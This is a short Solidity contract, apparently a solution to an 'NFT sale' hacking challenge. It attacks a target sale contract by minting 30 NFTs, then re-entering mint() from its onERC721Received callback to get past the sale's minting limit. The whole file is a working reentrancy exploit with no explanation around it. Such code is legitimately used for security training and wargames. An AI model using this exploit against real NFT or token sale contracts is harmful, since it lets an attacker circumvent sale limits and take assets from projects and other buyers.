// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.10;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface INft {
    function mint(uint256 numberOfNfts) external payable;

    function getNFTPrice() external returns (uint256 price);
}

contract HackNftSaleChallenge is IERC721Receiver {
    bool minted;
    address instance;

    constructor(address _instance) {
        minted = false;
        instance = _instance;
    }

    function hack() external payable {
        mint();
    }

    function mint() private {
        INft sale = INft(instance);
        uint256 price = sale.getNFTPrice();
        sale.mint{ value: price * 30 }(30);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (!minted) {
            minted = true;
            mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
